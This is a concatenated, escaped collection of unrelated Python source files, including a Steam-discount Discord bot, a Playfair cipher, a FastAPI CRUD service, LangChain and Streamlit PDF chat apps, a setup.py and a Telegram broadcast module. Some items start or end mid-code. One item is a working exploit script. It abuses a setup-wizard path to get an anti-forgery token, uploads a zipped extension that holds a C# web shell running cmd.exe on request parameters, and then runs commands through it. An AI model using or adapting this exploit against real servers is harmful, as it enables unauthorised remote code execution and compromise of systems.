check_for_new_game.start()\n\n\n@bot.command(aliases=(\"\u041f\u0440\u0438\u0432\u0435\u0442\", \"\u043f\u0440\u0438\u0432\u0435\u0442\", \"\u041f\u0440\u0438\u0432\u0435\u0442\u0438\u043a\", \"\u043f\u0440\u0438\u0432\u0435\u0442\u0438\u043a\"))\nasync def hi(ctx: commands.Context):\n    print(f\"Said \u041f\u0440\u0438\u0432\u0435\u0442\u0438\u043a to {ctx.author}\")\n    await ctx.reply(\"\u041f\u0440\u0438\u0432\u0435\u0442\u0438\u043a\")\n\n\n@bot.command(aliases=(\"\u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c\", \"add\"))\nasync def add_channel(ctx: commands.Context, channel_id: int = 0):\n    if not channel_id:\n        channel_id: int = ctx.channel.id\n    with open(data_path, \"r+\") as file:\n        data = load(file)\n        if channel_id not in data[\"channels\"]:\n            data['channels'].append(channel_id)\n        file.seek(0)\n        dump(data, file, indent=2)\n        file.truncate()\n    await ctx.reply(f\"\u041a\u0430\u043d\u0430\u043b (ID: {channel_id}) \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d \u0432 \u0441\u043f\u0438\u0441\u043e\u043a\")\n\n\n@bot.command(aliases=(\"\u0443\u0434\u0430\u043b\u0438\u0442\u044c\", \"remove\"))\nasync def remove_channel(ctx: commands.Context, channel_id: int = 0):\n    if not channel_id:\n        channel_id: int = ctx.channel.id\n    with open(data_path, \"r+\") as file:\n        data = load(file)\n        if channel_id in data[\"channels\"]:\n            data['channels'].remove(channel_id)\n        file.seek(0)\n        dump(data, file, indent=2)\n        file.truncate()\n    await ctx.reply(f\"\u041a\u0430\u043d\u0430\u043b (ID: {channel_id}) \u0443\u0434\u0430\u043b\u0451\u043d \u0438\u0437 \u0441\u043f\u0438\u0441\u043a\u0430\")\n\n\nasync def fetch_data(url: str) -> dict:\n    async with aiohttp.ClientSession() as session:\n        async with session.get(url) as response:\n            return await response.json()\n\n\nasync def get_price(appid: str) -> dict:\n    global price\n    try:\n        price = await fetch_data(priceurl + str(appid))\n        return price[\"data\"][\"price_overview\"]\n    except KeyError:\n        return price\n    except Exception as e:\n        return await get_price(appid)\n\n\n@bot.command(aliases=(\"\u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0442\u044c_\u0441\u043a\u0438\u0434\u043a\u0438\", \"\u0441\u043a\u0438\u0434\u043a\u0438\"))\nasync def show_discounts(ctx: commands.Context, value: bool = None):\n    global show_discount_games\n    if value is not None:\n        show_discount_games = bool(value)\n        with open(data_path, \"r+\") as file:\n            data = load(file)\n            data[\"show_discount_games\"] = show_discount_games\n            file.seek(0)\n            dump(data, file, indent=2)\n            file.truncate()\n        await ctx.reply(f\"\u0422\u0435\u043f\u0435\u0440\u044c \u0438\u0433\u0440\u044b \u0441\u043e \u0441\u043a\u0438\u0434\u043a\u043e\u0439 {'\u041f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u044e\u0442\u0441\u044f' if show_discount_games else '\u041d\u0435 \u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u044e\u0442\u0441\u044f'}\")\n    else:\n        await ctx.reply(\n            f\"\u041d\u0430 \u0434\u0430\u043d\u043d\u044b\u0439 \u043c\u043e\u043c\u0435\u043d\u0442 \u0438\u0433\u0440\u044b \u0441\u043e \u0441\u043a\u0438\u0434\u043a\u043e\u0439 {'\u041f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u044e\u0442\u0441\u044f' if show_discount_games else '\u041d\u0435 \u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u044e\u0442\u0441\u044f'}\"\n        )\n\n\ndef get_final_date(appid: int) -> str:\n    url = \"https://store.steampowered.com/app/\" + str(appid)\n    soup = BeautifulSoup(requests.get(url).text, features=\"html.parser\")\n    data = soup.find(\"p\", class_=\"game_purchase_discount_countdown\")\n    if data is not None:\n        if not data.find(\"span\"):  # Future\n            date = mktime(datetime.strptime(\" \".join(data.text.split()[-2:]), \"%d %B\").replace(\n                year=datetime.now().year).timetuple())\n            return f\"<t:{int(date)}:R>\"\n        else:\n            script = data.parent.find(\"script\").__str__()\n            if script != \"None\":  # If soon\n                unixtime = re.search(r\"InitDailyDealTimer\\( \\$DiscountCountdown, (\\d{10}) \\)\", script)\n                date = mktime(datetime.fromtimestamp(int(unixtime.group(1))).timetuple())\n                return f\"<t:{int(date)}:R>\"\n    else:  # Free\n        data = soup.find(\"p\", class_=\"game_purchase_discount_quantity\").text.split(\"\\n\")[1].lstrip().split()\n\n        date = mktime(datetime.strptime(f\"{data[-6]} {data[-5]} {data[-3]}\", \"%d %b %H:%M%p.\").replace(\n            year=datetime.now().year).timetuple())\n        return f\"<t:{int(date)}:R>\"\n\n\n@tasks.loop()\nasync def check_for_new_game():\n    global price, last_seen, seen\n    json_data = await fetch_data(applisturl)\n    for app in json_data['applist']['apps']:\n        try:\n            app[\"appid\"]: int\n            game_is_free: bool = False\n            price = await get_price(app['appid'])\n            if not price[str(app['appid'])][\"success\"]:\n                continue\n      ",
    "def prepare_input(text):\n    # Convert the text to uppercase and replace J with I\n    text = text.upper().replace(\"J\", \"I\")\n    # Remove any characters that are not letters\n    text = ''.join(filter(str.isalpha, text))\n    return text\n\ndef generate_key_square(key):\n    key_square = [['' for _ in range(5)] for _ in range(5)]\n    key_set = set()\n\n    # Create the key square\n    i, j = 0, 0\n    for letter in key + 'ABCDEFGHIKLMNOPQRSTUVWXYZ':\n        if letter not in key_set:\n            key_square[i][j] = letter\n            key_set.add(letter)\n            j += 1\n            if j == 5:\n                j = 0\n                i += 1\n\n    return key_square\n\ndef find_position(matrix, char):\n    for i, row in enumerate(matrix):\n        if char in row:\n            return i, row.index(char)\n\ndef encrypt_pair(pair, key_square):\n    (x1, y1), (x2, y2) = find_position(key_square, pair[0]), find_position(key_square, pair[1])\n\n    if x1 == x2:\n        return key_square[x1][(y1 + 1) % 5] + key_square[x2][(y2 + 1) % 5]\n    elif y1 == y2:\n        return key_square[(x1 + 1) % 5][y1] + key_square[(x2 + 1) % 5][y2]\n    else:\n        return key_square[x1][y2] + key_square[x2][y1]\n\ndef playfair_encrypt(plaintext, key):\n    plaintext = prepare_input(plaintext)\n    key_square = generate_key_square(key)\n\n    encrypted_text = ''\n    i = 0\n    while i < len(plaintext):\n        pair = plaintext[i:i + 2]\n        if len(pair) == 1:\n            pair += 'X'\n            i -= 1\n\n        encrypted_text += encrypt_pair(pair, key_square)\n        i += 2\n\n    return encrypted_text\n\n# Example usage:\nplaintext = \"NATNAEL\"\nkey = \"SECRETKEY\"\n\ncipher_text = playfair_encrypt(plaintext, key)\nprint(\"Original Text:\", plaintext)\nprint(\"Encrypted Text:\", cipher_text)\n",
    "from fastapi import FastAPI, HTTPException\nfrom typing import List\nfrom schemas import Asset\n\napp = FastAPI()\nassets: list[Asset] = []\n\n\n@app.post(\"/assets/\", response_model=Asset)\ndef create_asset(asset: Asset):\n    asset.id = len(assets) + 1\n    assets.append(asset)\n    return asset\n\n\n@app.get(\"/assets/\", response_model=List[Asset])\ndef read_assets():\n    return assets\n\n\n@app.get(\"/assets/{asset_id}\", response_model=Asset)\ndef read_asset(asset_id: int):\n    asset = next((a for a in assets if a.id == asset_id), None)\n    if asset is None:\n        raise HTTPException(status_code=404, detail=\"Asset not found\")\n    return asset\n\n\n@app.put(\"/assets/{asset_id}\", response_model=Asset)\ndef update_asset(asset_id: int, asset_update: Asset):\n    asset = next((a for a in assets if a.id == asset_id), None)\n    if asset is None:\n        raise HTTPException(status_code=404, detail=\"Asset not found\")\n    asset.value = asset_update.value\n    return asset\n\n\n@app.delete(\"/assets/{asset_id}\", response_model=Asset)\ndef delete_asset(asset_id: int):\n    global assets\n    asset = next((a for a in assets if a.id == asset_id), None)\n    if asset is None:\n        raise HTTPException(status_code=404, detail=\"Asset not found\")\n    assets = [a for a in assets if a.id != asset_id]\n    return asset\n",
    "# Import the necessary modules and functions\nimport os\nfrom dotenv import load_dotenv\nimport code\nfrom unstructured.partition.pdf import partition_pdf\nfrom pydantic import BaseModel\nfrom typing import Any\n\nfrom langchain_openai import ChatOpenAI, OpenAIEmbeddings\nfrom langchain.retrievers import MultiVectorRetriever\nfrom langchain.storage import InMemoryStore\nfrom langchain_community.vectorstores.elasticsearch import ElasticsearchStore\n\nfrom elasticsearch import Elasticsearch\n\nfrom langchain_core.prompts import ChatPromptTemplate\nfrom langchain_core.output_parsers import StrOutputParser\nfrom langchain_core.runnables import (\n  RunnableLambda,\n  RunnablePassthrough\n)\nfrom langchain_core.documents import Document\nfrom langchain.output_parsers import JsonOutputToolsParser\n\nimport uuid\nfrom typing import Union\nfrom operator import itemgetter\nimport pickle\nfrom itertools import chain\nfrom langchain_core.pydantic_v1 import SecretStr\n\n# Load the .env file. By default, it looks for the .env file in the same directory as the script being run, or you can specify the path as an argument.\nload_dotenv()\n\nOPENAI_API_KEY=os.getenv(\"OPENAI_API_KEY\", \"\")\nAPI_KEY_UNSTRUCTURED = os.getenv(\"API_KEY_UNSTRUCTURED\", \"\")\nAPI_BASE_URL_UNSTRUCTURED = os.getenv(\"API_BASE_URL_UNSTRUCTURED\", \"\")\nES_HOST = os.getenv(\"ES_HOST\", \"\")\nES_PORT = int(os.getenv(\"ES_PORT\", \"9200\"))\nES_INDEX = os.getenv(\"ES_INDEX\", \"\")\n\nmodel = ChatOpenAI(temperature=0, model=\"gpt-3.5-turbo-1106\", api_key=SecretStr(OPENAI_API_KEY) )\nVectorStoreSingleton = None\nESSingleton = None\n\nclass Element(BaseModel):\n  type: str\n  text: Any\n\n# TODO: These should really be loaded on the fly from the filesystem\n# Define list containing pdf paths and pdf names to be used throughout later on\npdf_paths = [\n            # \"./docs/amazon/amazon-2019.pdf\",\n            #  \"./docs/amazon/amazon-2020.pdf\",\n            #  \"./docs/amazon/amazon-2021.pdf\",\n            #  \"./docs/amazon/amazon-2022.pdf\",\n            #  \"./docs/amazon/amazon-2023.pdf\", \n             \"./docs/amazon/amazon-2024.pdf\",\n            #  \"./docs/alphabet/20210203-alphabet-10k\",\n            #  \"./docs/alphabet/20220202-alphabet-10k\",\n             \"./docs/alphabet/goog-10-k-2023.pdf\",\n            #  \"./docs/alphabet/goog-10-k-q4-2022.pdf\"\n]\npdfs = [\n        # \"amazon-2019.pdf\",\n        # \"amazon-2020.pdf\", \n        # \"amazon-2021.pdf\", \n        # \"amazon-2023.pdf\", \n        \"amazon-2024.pdf\",\n        # \"20210203-alphabet-10k\",\n        # \"20220202-alphabet-10k\",\n        \"goog-10-k-2023.pdf\",\n        # \"goog-10-k-q4-2022.pdf\"\n        ]\n\n#################### ES / Vector Store Funcs ####################\ndef getVectorStore():\n  global VectorStoreSingleton\n  if VectorStoreSingleton is None:\n    print(\"Setting up vector store\")\n    VectorStoreSingleton = ElasticsearchStore(\n        # https://python.langchain.com/docs/integrations/vectorstores/elasticsearch\n        embedding=OpenAIEmbeddings(model=\"text-embedding-3-small\", api_key=SecretStr(OPENAI_API_KEY)),\n        es_url=\"http://\"+ES_HOST+\":\"+str(ES_PORT),\n        index_name=ES_INDEX,\n        strategy=ElasticsearchStore.ApproxRetrievalStrategy()\n    )\n  else:\n    print(\"Vector store already set up\")\n\n  return VectorStoreSingleton\n\ndef get_es():\n  global ESSingleton\n  if ESSingleton is None:\n    print(\"Setting up ES\")\n    ESSingleton = Elasticsearch([{'host': ES_HOST, 'port': ES_PORT, 'scheme': 'http'}])\n  else:\n    print(\"ES already set up\")\n\n  return ESSingleton\n\n#################### Data Loading & Processing Funcs ####################\ndef processPDFsToPickles():\n  raw_pdfs_elements = []\n\n  # Get parsed elements for each PDF\n  for i,pdf_path in enumerate(pdf_paths):\n    print(f\"processing: {pdf_path}\")\n    raw_pdfs_elements.append(\n      partition_pdf(\n        # https://unstructured-io.github.io/unstructured/apis/api_parameters.html\n        filename=pdf_path,\n        extract_images_in_pdf=False,\n        infer_table_structure=True,\n        chunking_strategy=\"by_title\",\n        max_characters=1800,\n        new_after_n_chars=1500,\n        combine_text_under_n_chars=1000,\n        image_output_dir_path=\"./\",\n        url=API_BASE_URL_UNSTRUCTURED,\n        token=API_KEY_UNSTRUCTURED,\n        verbose=True\n      )\n    )\n\n    # store the parsed elements as pickles to reuse them whenever necessary\n    with open(f'{pdf_path}-{i}.pkl', 'wb') as f:\n      print(f\"saving: {pdf_path}-{i}\")\n      pickle.dump(raw_pdfs_elements[i], f)\n\n  return raw_pdfs_elements\n\ndef loadDataFromPickles(pickle_paths):\n  # Load from pickle\n  raw_pdf_elements = []\n  for pdf in pickle_paths:\n    with open(f\"{pdf}\", 'rb') as f:\n      raw_pdf_elements.append(pickle.load(f))\n      \n  return raw_pdf_elements\n\ndef processTablesAndText(raw_pdfs_elements):\n  # Categorize by type\n  print(\"Categorizing elements\")\n  categorized_elements = [\n      [\n          Element(type=\"table\", text=str(element.metadata.text_as_html))\n          if \"unstructured.documents.elements.Table\" in str(type(element))\n          else Element(type",
    "import argparse\nimport base64\nimport re\nimport sys\nimport warnings\nfrom distutils.version import LooseVersion\nimport requests\nimport random\nimport string\nimport zipfile\nimport urllib3\n\nDELETE_STATUS=False\nwarnings.filterwarnings(\"ignore\", category=DeprecationWarning)\nurllib3.disable_warnings()\n\nexploit_header = {\n    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\"\n}\n\nGREEN = \"\\033[92m\"\nRESET = \"\\033[0m\"\ndef rand_text_hex(length):\n    return ''.join(random.choice('0123456789abcdef') for _ in range(length))\ndef rand_text_alpha_lower(length):\n    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))\ndef rand_text_alpha(length):\n    return ''.join(random.choice(string.ascii_letters) for _ in range(length))\n\nplugin_guid = '-'.join([rand_text_hex(a) for a in [8, 4, 4, 4, 12]])\npayload_ashx = f\"{rand_text_alpha_lower(8)}.ashx\"\npayload_handler_class = rand_text_alpha(8)\npayload_psi_var = rand_text_alpha(8)\nsession = requests.Session()\n\ndef GetAntiForgeryToken(url, username, password):\n    try:\n        ##\u5982\u679c\u662f\u6b63\u7248\u7684\u8bdd\uff0c\u5219\u4e0d\u9700\u8981SetupWizard.aspx/\n        resp = session.get(url=url + \"/SetupWizard.aspx/Administration\", auth=(username, password), verify=False, headers=exploit_header, proxies=proxy)\n        antiForgeryToken = re.search(r'\"antiForgeryToken\"\\s*:\\s*\"([a-zA-Z0-9+/=]+)\"', resp.text).group(1)\n        return antiForgeryToken\n    except:\n        return None\n\ndef CreateExtension():\n    payload_data = f'''<% @ WebHandler Language=\"C#\" Class=\"{payload_handler_class}\" %>\nusing System;\nusing System.Web;\nusing System.Diagnostics;\npublic class {payload_handler_class} : IHttpHandler\n{{\n    public void ProcessRequest(HttpContext ctx)\n    {{\n        string command = ctx.Request.QueryString[\"cmd\"];\n        if (!string.IsNullOrEmpty(command))\n        {{\n            ExecuteCommand(command, ctx);\n        }}\n        else\n        {{\n            ctx.Response.ContentType = \"text/plain\";\n        }}\n    }}\n    private void ExecuteCommand(string cmd, HttpContext ctx)\n    {{\n        ProcessStartInfo {payload_psi_var} = new ProcessStartInfo();\n        {payload_psi_var}.FileName = \"cmd.exe\";\n        {payload_psi_var}.Arguments = $\"/c {{cmd}}\";\n        {payload_psi_var}.RedirectStandardOutput = true;\n        {payload_psi_var}.UseShellExecute = false;\n        using (Process process = new Process())\n        {{\n            process.StartInfo = {payload_psi_var};\n            process.Start();\n            string output = process.StandardOutput.ReadToEnd();\n            process.WaitForExit();\n            ctx.Response.ContentType = \"text/plain\";\n            ctx.Response.Write(output);\n        }}\n    }}\n    public bool IsReusable {{ get {{ return true; }} }}\n}}'''\n    manifest_data = f'''<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<ExtensionManifest>\n  <Version>1</Version>\n  <Name>{rand_text_alpha_lower(8)}</Name>\n  <Author>{rand_text_alpha_lower(8)}</Author>\n  <ShortDescription>{rand_text_alpha_lower(8)}</ShortDescription>\n  <LoadMessage>null</LoadMessage>\n  <Components>\n    <WebServiceReference SourceFile=\"{payload_ashx}\"/>\n  </Components>\n</ExtensionManifest>'''\n    zip_resources = zipfile.ZipFile(\"resources.zip\", 'w')\n    zip_resources.writestr(f\"{plugin_guid}/Manifest.xml\", manifest_data)\n    zip_resources.writestr(f\"{plugin_guid}/{payload_ashx}\", payload_data)\n    zip_resources.close()\n\ndef UploadExtension(url, anti_forgery_token):\n    with open(\"resources.zip\", \"rb\") as f:\n        zip_data = f.read()\n    zip_data_base64 = base64.b64encode(zip_data).decode()\n    headers = {\n        \"X-Anti-Forgery-Token\": anti_forgery_token,\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36\"\n    }\n    url = url + \"/Services/ExtensionService.ashx/InstallExtension\"\n    session.cookies.update({\"settings\": \"%7B%22collapsedPanelMap%22%3A%7B%22Inactive%22%3Atrue%7D%7D\"})\n    try:\n        response = session.post(url=url, data=f\"[\\\"{zip_data_base64}\\\"]\", headers=headers, verify=False, proxies=proxy)\n        if response.status_code == 200:\n            print(f\"[+] The malicious extension was uploaded successfully, with the ID: {plugin_guid}\")\n        else:\n            print(\"[-] Malicious extension upload failed, please check the network and try again or try to exploit manually\")\n    except Exception as err:\n        print(\"[-] Error in func <UploadExtension>, error message: \" + str(err))\n\ndef ExecuteCommand(url):\n\n        resp = session.get(url=url + f\"/App_Extensions/{plugin_guid}/{payload_ashx}\", headers=exploit_header, verify=False, proxies=proxy)\n        if resp.status_code == 200:\n            print(f\"[+] Shell Url: {url + f'/App_Extensions/{plugin_guid}/{payload_ashx}'}\")\n            print(\"[+] \u6267\u884c\u56fa\u5b9a\u547d\u4ee4 whoami\")\n            cmd = 'whoami'\n            resp = session.get(url=url + f\"/App_Extensions/{plugin_guid}/{payload_ashx}?cmd={cmd}\", headers=exploit_",
    "from setuptools import setup, find_packages\n\nwith open('README.md', encoding='utf-8') as f:\n    long_description = f.read()\n\nwith open('requirements.txt', encoding='utf-8') as f:\t\n    requirements = f.read().splitlines()\n\nsetup(\n    name='modelcaller',\n    version='0.1',\n    packages=find_packages(),\n    description='ModelCaller for AI',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    author='Mukesh Dalal',\n    author_email='mukesh@aidaa.ai',\n    url='https://github.com/mukdal/modelcaller',\n\n    python_requires='>=3.9',\t\n    install_requires=requirements,\n    \n    data_files=[('', ['LICENSE.txt'])],\n    license='Custom',\n    license_files=('LICENSE.txt',),\n    keywords='modelcaller artficial intelligence machine learning ml ai systems transformation model',\n\n        classifiers=[\t\n        \"Development Status :: 3 - Alpha\",\t\n        \"Intended Audience :: Developers\",\t\n        \"License :: Free for non-commercial use\",\t\n        \"Operating System :: OS Independent\",\t\n        'Topic :: Software Development :: Libraries',\t\n        \"Programming Language :: Python :: 3\",\t\n        \"Programming Language :: Python :: 3.12\",\t\n    ],\n\n)",
    "import streamlit as st\nfrom dotenv import load_dotenv\nfrom PyPDF2 import PdfReader\nfrom langchain.text_splitter import CharacterTextSplitter\nfrom langchain_community.embeddings import OpenAIEmbeddings\nfrom langchain_community.vectorstores import FAISS\nfrom langchain_community.chat_models import ChatOpenAI\nfrom langchain.memory import ConversationBufferMemory\nfrom langchain.chains import ConversationalRetrievalChain\nfrom htmlTemplates import css, bot_template, user_template\n\n\ndef get_pdf_text(pdf_docs):\n    text = \"\"\n    for pdf in pdf_docs:\n        # Manually create a PdfReader instance\n        pdf_reader = PdfReader(pdf)\n        for page in pdf_reader.pages:\n            page_text = page.extract_text()\n            if page_text:  # Ensure there's text to add\n                text += page_text\n        # No need to explicitly close the PdfReader as it does not lock the file\n    return text\n\n\ndef get_text_chunks(text):\n    text_splitter = CharacterTextSplitter(\n        separator=\"\\n\",\n        chunk_size=1000,\n        chunk_overlap=200,\n        length_function=len\n    )\n    return text_splitter.split_text(text)\n\n\ndef get_vectorstore(text_chunks):\n    embeddings = OpenAIEmbeddings()\n    return FAISS.from_texts(texts=text_chunks, embedding=embeddings)\n\n\ndef get_conversation_chain(vectorstore):\n    llm = ChatOpenAI()\n    memory = ConversationBufferMemory(memory_key='chat_history', return_messages=True)\n    return ConversationalRetrievalChain.from_llm(llm=llm, retriever=vectorstore.as_retriever(), memory=memory)\n\n\ndef handle_userinput(user_question):\n    response = st.session_state.conversation({'question': user_question})\n    st.session_state.chat_history = response['chat_history']\n    display_chat_messages(st.session_state.chat_history)\n\n\ndef display_chat_messages(messages):\n    for msg_index, message in enumerate(messages):\n        if msg_index % 2 == 0:\n            st.write(user_template.replace(\n                \"{{MSG}}\", message.content), unsafe_allow_html=True)\n        else:\n            st.write(bot_template.replace(\n                \"{{MSG}}\", message.content), unsafe_allow_html=True)\n\n\ndef main_page():\n    st.header(\"Chat with multiple PDFs :books:\")\n    user_question = st.text_input(\"Ask a question about your documents:\")\n    if user_question:\n        handle_userinput(user_question)\n\n\ndef about_page():\n    st.title(\"About\")\n    st.markdown(\"\"\"\n    This page is about the project and the developers involved.\n    - **Project**: Description of the project.\n    - **Developers**: Who developed the project.\n    \"\"\")\n\n\ndef home_page():\n    st.title(\"Welcome to the PDF Chatbot, hosted by 'David'!\")\n    st.write(\"This is a Streamlit intergrated webapp that allows you to chat with a 'David' about the contents of multiple PDF documents of your choice.\")\n    st.write(\"To get started, upload your PDF documents and click the 'Process' button. Once the processing is complete, you can ask 'David' questions about the contents of the PDFs.\")\n    st.write(\"You can navigate to the 'Streamlit Chatbot Page' to start chatting with 'David'...\")\n    st.write(\"You can also navigate to the 'About' page to learn more about the project and the developers involved.\")\n    st.write(\"Enjoy chatting with 'David'! :smiley:\")\n\n\ndef main():\n    load_dotenv()\n    st.set_page_config(page_title=\"Chat with multiple PDFs\", page_icon=\":books:\")\n    st.write(css, unsafe_allow_html=True)\n\n    if \"chat_history\" not in st.session_state:\n        st.session_state.chat_history = []\n\n    # Define pages in the main function\n    pages = {\n        \"Home\": home_page,\n        \"About\": about_page,\n        \"Streamlit Chatbot Page\": main_page\n    }\n\n    # Navigation menu at the top of the sidebar\n    with st.sidebar:\n        page = st.selectbox(\"Navigate\", list(pages.keys()))\n\n        # Add a custom \"margin\" (spacing) below the navigation\n        st.markdown(\"<div style='margin-bottom: 7em;'></div>\", unsafe_allow_html=True)\n\n        # File uploader moved below the navigation menu\n        pdf_docs = st.file_uploader(\"Upload your PDFs here\", accept_multiple_files=True)\n        if st.button(\"Process\"):\n            with st.spinner(\"Processing...\"):\n                if pdf_docs:\n                    raw_text = get_pdf_text(pdf_docs)\n                    text_chunks = get_text_chunks(raw_text)\n                    vectorstore = get_vectorstore(text_chunks)\n                    st.session_state.conversation = get_conversation_chain(vectorstore)\n                    st.success(\"Ready to chat!\")\n                else:\n                    st.error(\"Please upload at least one PDF document.\")\n\n    # Call the page rendering function based on the user's selection\n    pages[page]()\n\n\nif __name__ == '__main__':\n    main()\n",
    "from io import BytesIO\nfrom time import sleep\nfrom pyrogram import filters\nfrom pyrogram.types import Message\nfrom telegram import TelegramError, Update\nfrom telegram.error import BadRequest, Unauthorized\nfrom telegram.ext import CallbackContext, CommandHandler, Filters, MessageHandler\nimport MukeshRobot.modules.no_sql.users_db as user_db \nfrom MukeshRobot import pbot as Mukesh\nfrom MukeshRobot import DEV_USERS, LOGGER as  logger, OWNER_ID, dispatcher\nfrom MukeshRobot.modules.helper_funcs.chat_status import dev_plus, sudo_plus\nfrom MukeshRobot.modules.no_sql.users_db import get_all_users\nfrom pyrogram import Client\nfrom pyrogram.types import Message\nfrom pyrogram.errors import (\n    FloodWait,\n    InputUserDeactivated,\n    UserIsBlocked,\n    PeerIdInvalid,\n)\nimport time, asyncio, logging, datetime\n\nUSERS_GROUP = 4\nCHAT_GROUP = 5\nDEV_AND_MORE = DEV_USERS.append(int(OWNER_ID))\n\n\ndef get_user_id(username):\n    # ensure valid userid\n    if len(username) <= 5:\n        return None\n\n    if username.startswith(\"@\"):\n        username = username[1:]\n\n    users = user_db.get_userid_by_name(username)\n\n    if not users:\n        return None\n\n    if len(users) == 1:\n        return users[0][\"_id\"]\n\n    for user_obj in users:\n        try:\n            userdat = dispatcher.bot.get_chat(user_obj[\"_id\"])\n            if userdat.username == username:\n                return userdat.id\n\n        except BadRequest as excp:\n            if excp.message != \"Chat not found\":\n                logger.exception(\"Error extracting user ID\")\n\n    return None\n\n\n\n@dev_plus\n@Mukesh.on_message(filters.command([\"bchat\",\"broadcastgroups\"]) & filters.user(OWNER_ID) & filters.reply)\nasync def broadcast_handler(bot: Client, m: Message):\n    all_chats = user_db.get_all_chats() or []\n    await bot.send_message(\n        OWNER_ID,\n        f\"{m.from_user.mention} or {m.from_user.id} I\ua731 \ua731\u1d1b\u1d00\u0280\u1d1b\u1d07\u1d05 \u1d1b\u029c\u1d07 B\u0280\u1d0f\u1d00\u1d05\u1d04\u1d00\ua731\u1d1b......\",\n    )\n    broadcast_msg = m.reply_to_message\n    sts_msg = await m.reply_text(f\"broadcasting ..\")\n    done = 0\n    failed = 0\n    success = 0\n    start_time = time.time()\n    total_chats = len(user_db.get_all_chats())\n\n    for chat in all_chats:\n        sts = await send_chat(chat[\"chat_id\"], broadcast_msg)\n\n        if sts == 200:\n            success += 1\n        else:\n            failed += 1\n        if sts == 400:\n            pass\n        done += 1\n        if not done % 20:\n            await sts_msg.edit(\n                f\"B\u0280\u1d0f\u1d00\u1d05\u1d04\u1d00\ua731\u1d1b I\u0274 P\u0280\u1d0f\u0262\u0280\u1d07\ua731\ua731: \\nT\u1d0f\u1d1b\u1d00\u029f \u1d04\u029c\u1d00\u1d1b\ua731  {total_chats} \\nC\u1d0f\u1d0d\u1d29\u029f\u1d07\u1d1b\u1d07\u1d05: {done} / {total_chats}\\nS\u1d1c\u1d04\u1d04\u1d07\ua731\ua731: {success}\\nF\u1d00\u026a\u029f\u1d07\u1d05: {failed}\"\n            )\n    completed_in = datetime.timedelta(seconds=int(time.time() - start_time))\n    await sts_msg.edit(\n        f\"B\u0280\u1d0f\u1d00\u1d05\u1d04\u1d00\ua731\u1d1b C\u1d0f\u1d0d\u1d29\u029f\u1d07\u1d1b\u1d07\u1d05: \\nC\u1d0f\u1d0d\u1d29\u029f\u1d07\u1d1b\u1d07\u1d05 I\u0274 {completed_in}.\\n\\nT\u1d0f\u1d1b\u1d00\u029f \u1d04\u029c\u1d00\u1d1b\ua731 {total_chats}\\nC\u1d0f\u1d0d\u1d29\u029f\u1d07\u1d1b\u1d07\u1d05: {done} / {total_chats}\\nS\u1d1c\u1d04\u1d04\u1d07\ua731\ua731: {success}\\nF\u1d00\u026a\u029f\u1d07\u1d05: {failed}\"\n    )\n\n\nasync def send_chat(chat_id, message):\n    try:\n        await message.forward(chat_id=int(chat_id))\n        return 200\n    except FloodWait as e:\n        await asyncio.sleep(e.value)\n        return send_msg(chat_id, message)\n    except InputUserDeactivated:\n        logger.info(f\"{chat_id} : D\u1d07\u1d00\u1d04\u1d1b\u026a\u1d20\u1d00\u1d1b\u1d07\u1d05\")\n        return 400\n    except UserIsBlocked:\n        logger.info(f\"{chat_id} : B\u029f\u1d0f\u1d04\u1d0b\u1d07\u1d05 T\u029c\u1d07 B\u1d0f\u1d1b\")\n        return 400\n    except PeerIdInvalid:\n        logger.info(f\"{chat_id} : U\ua731\u1d07\u0280 I\u1d05 I\u0274\u1d20\u1d00\u029f\u026a\u1d05\")\n        return 400\n    except Exception as e:\n        logger.error(f\"{chat_id} : {e}\")\n        pass\n\n@dev_plus\n# broadcast\n@Mukesh.on_message(filters.command([\"buser\",\"broadcastusers\"]) & filters.user(OWNER_ID) & filters.reply)\nasync def broadcast_handler(bot: Client, m: Message):\n    all_users = get_all_users()\n    await bot.send_message(\n        OWNER_ID,\n        f\"{m.from_user.mention} or {m.from_user.id} I\ua731 \ua731\u1d1b\u1d00\u0280\u1d1b\u1d07\u1d05 \u1d1b\u029c\u1d07 B\u0280\u1d0f\u1d00\u1d05\u1d04\u1d00\ua731\u1d1b......\",\n    )\n    broadcast_msg = m.reply_to_message\n    sts_msg = await m.reply_text(f\"broadcasting ..\")\n    done = 0\n    failed = 0\n    success = 0\n    start_time = time.time()\n    total_users = len(get_all_users())\n    for user in all_users:\n        sts = await send_msg(user[\"_id\"], broadcast_msg)\n        if sts == 200:\n            success += 1\n        else:\n            failed += 1\n        if sts == 400:\n            pass\n        done += 1\n        if not done % 20:\n            await sts_msg.edit(\n                f\"B\u0280\u1d0f\u1d00\u1d05\u1d04\u1d00\ua731\u1d1b I\u0274 P\u0280\u1d0f\u0262\u0280\u1d07\ua731\ua731: \\nT\u1d0f\u1d1b\u1d00\u029f U\ua731\u1d07\u0280\ua731 {total_users} \\nC\u1d0f\u1d0d\u1d29\u029f\u1d07\u1d1b\u1d07\u1d05: {done} / {total_users}\\nS\u1d1c\u1d04\u1d04\u1d07\ua731\ua731: {success}\\nF\u1d00\u026a\u029f\u1d07\u1d05: {failed}\"\n            )\n    completed_in = datetime.timedelta(seconds=int(time.time() - start_time))\n    await sts_msg.edit(\n        f\"B\u0280\u1d0f\u1d00\u1d05\u1d04\u1d00\ua731\u1d1b C\u1d0f\u1d0d\u1d29\u029f\u1d07\u1d1b\u1d07\u1d05: \\nC\u1d0f\u1d0d\u1d29\u029f\u1d07\u1d1b\u1d07\u1d05 I\u0274 {completed_in}.\\n\\nT\u1d0f\u1d1b\u1d00\u029f U\ua731\u1d07\u0280\ua731 {total_users}\\nC\u1d0f\u1d0d\u1d29\u029f\u1d07\u1d1b\u1d07\u1d05: {done} / 